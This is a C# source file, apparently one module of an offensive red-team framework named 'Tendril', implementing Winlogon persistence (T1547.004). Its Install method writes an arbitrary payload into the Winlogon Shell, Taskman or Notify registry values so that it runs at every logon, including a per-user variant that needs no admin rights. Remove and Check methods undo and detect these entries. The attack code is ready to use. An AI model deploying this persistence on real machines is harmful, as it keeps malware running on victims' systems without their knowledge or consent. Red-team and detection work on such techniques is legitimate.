using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Winlogon Helper DLL / Shell Persistence (T1547.004)
    ///
    /// Winlogon loads DLLs and executables specified in several registry values:
    ///   - Shell: the user shell (default: explorer.exe). Replacing or appending
    ///     gives persistence on every logon.
    ///   - Notify: legacy notification package DLLs (pre-Vista, but the key
    ///     still exists and some third-party software uses it).
    ///   - Taskman: alternative task manager loaded by Winlogon.
    ///
    /// Userinit is handled by UserInitMprLogon module.
    /// Requires admin (HKLM). HKCU\...\Winlogon\Shell also works (no admin)
    /// as a per-user override.
    /// </summary>
    public class WinlogonHelper : ITendril
    {
        public string Name { get { return "WinlogonHelper"; } }
        public string Description { get { return "Winlogon Shell/Notify/Taskman DLL - runs at every logon"; } }
        public string MitreId { get { return "T1547.004"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        private const string WinlogonHKLM = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        private const string WinlogonHKCU = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, target, hive;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<path>");

            if (!options.TryGetValue("target", out target))
                target = "shell"; // "shell", "notify", "taskman"

            if (!options.TryGetValue("hive", out hive))
                hive = "HKCU"; // HKCU for no-admin shell override

            string regPath = hive.ToUpper() == "HKLM" ? WinlogonHKLM : WinlogonHKCU;

            switch (target.ToLower())
            {
                case "shell":
                    // HKCU Shell overrides HKLM - no admin needed for per-user persistence
                    // Append to preserve explorer.exe (otherwise no desktop)
                    string currentShell = RegistryUtils.GetRegValue(hive, regPath, "Shell");
                    if (string.IsNullOrEmpty(currentShell))
                        currentShell = "explorer.exe";

                    string newShell = currentShell + ", " + payload;
                    RegistryUtils.SetRegValue(hive, regPath, "Shell", newShell);

                    return new TendrilResult(ResultStatus.Success, Name,
                        string.Format("Winlogon Shell modified ({0})", hive))
                        .WithMeta("OriginalShell", currentShell)
                        .WithMeta("NewShell", newShell)
                        .WithMeta("Hive", hive);

                case "taskman":
                    RegistryUtils.SetRegValue(hive, regPath, "Taskman", payload);
                    return new TendrilResult(ResultStatus.Success, Name,
                        string.Format("Winlogon Taskman set ({0})", hive))
                        .WithMeta("Payload", payload);

                case "notify":
                    // Notify packages are DLLs, HKLM only
                    string notifyPath = WinlogonHKLM + @"\Notify\" + System.IO.Path.GetFileNameWithoutExtension(payload);
                    RegistryUtils.SetRegValue("HKLM", notifyPath, "DLLName", payload);
                    RegistryUtils.SetRegDword("HKLM", notifyPath, "Logon", 1);
                    RegistryUtils.SetRegDword("HKLM", notifyPath, "Impersonate", 0);
                    RegistryUtils.SetRegDword("HKLM", notifyPath, "Asynchronous", 1);
                    return new TendrilResult(ResultStatus.Success, Name,
                        "Winlogon Notify package installed")
                        .WithMeta("DLLName", payload)
                        .WithMeta("Key", @"HKLM\" + notifyPath);

                default:
                    return new TendrilResult(ResultStatus.Failed, Name,
                        "Unknown target. Use: shell, taskman, notify");
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string target, hive;
            if (!options.TryGetValue("target", out target))
                target = "shell";
            if (!options.TryGetValue("hive", out hive))
                hive = "HKCU";

            string regPath = hive.ToUpper() == "HKLM" ? WinlogonHKLM : WinlogonHKCU;

            switch (target.ToLower())
            {
                case "shell":
                    // Restore to default explorer.exe
                    if (hive.ToUpper() == "HKCU")
                        RegistryUtils.DeleteRegValue("HKCU", regPath, "Shell"); // remove override
                    else
                        RegistryUtils.SetRegValue("HKLM", regPath, "Shell", "explorer.exe");
                    return new TendrilResult(ResultStatus.Success, Name, "Winlogon Shell restored");

                case "taskman":
                    RegistryUtils.DeleteRegValue(hive, regPath, "Taskman");
                    return new TendrilResult(ResultStatus.Success, Name, "Winlogon Taskman removed");

                case "notify":
                    string payload;
                    if (options.TryGetValue("payload", out payload))
                    {
                        string notifyPath = WinlogonHKLM + @"\Notify\" + System.IO.Path.GetFileNameWithoutExtension(payload);
                        RegistryUtils.DeleteRegKeyTree("HKLM", notifyPath);
                    }
                    return new TendrilResult(ResultStatus.Success, Name, "Winlogon Notify package removed");

                default:
                    return new TendrilResult(ResultStatus.Failed, Name, "Unknown target");
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            // Check HKLM Winlogon values
            foreach (string val in new[] { "Shell", "Userinit", "Taskman" })
            {
                string v = RegistryUtils.GetRegValue("HKLM", WinlogonHKLM, val);
                if (!string.IsNullOrEmpty(v))
                {
                    bool isDefault = (val == "Shell" && v.Trim().ToLower() == "explorer.exe") ||
                                     (val == "Userinit" && v.Trim().ToLower().Replace(" ", "")
                                         .StartsWith(@"c:\windows\system32\userinit.exe"));
                    if (!isDefault || val == "Taskman")
                    {
                        results.Add(new TendrilResult(
                            isDefault ? ResultStatus.Info : ResultStatus.Warning, Name,
                            string.Format("HKLM Winlogon\\{0}: {1}", val, v))
                            .WithMeta("Value", v)
                            .WithMeta("ValueName", val));
                    }
                }
            }

            // Check HKCU overrides - any HKCU\...\Winlogon\Shell is suspicious
            string hkcuShell = RegistryUtils.GetRegValue("HKCU", WinlogonHKCU, "Shell");
            if (!string.IsNullOrEmpty(hkcuShell))
            {
                results.Add(new TendrilResult(ResultStatus.Warning, Name,
                    string.Format("HKCU Winlogon Shell override: {0}", hkcuShell))
                    .WithMeta("Value", hkcuShell)
                    .WithMeta("Scope", "HKCU - per-user"));
            }

            // Check Notify subkeys
            string[] notifyKeys = RegistryUtils.GetRegSubkeys("HKLM", WinlogonHKLM + @"\Notify");
            foreach (string nk in notifyKeys)
            {
                string dll = RegistryUtils.GetRegValue("HKLM", WinlogonHKLM + @"\Notify\" + nk, "DLLName");
                if (!string.IsNullOrEmpty(dll))
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("Winlogon Notify package: {0} -> {1}", nk, dll))
                        .WithMeta("Package", nk)
                        .WithMeta("DLL", dll));
                }
            }

            return results;
        }
    }
}
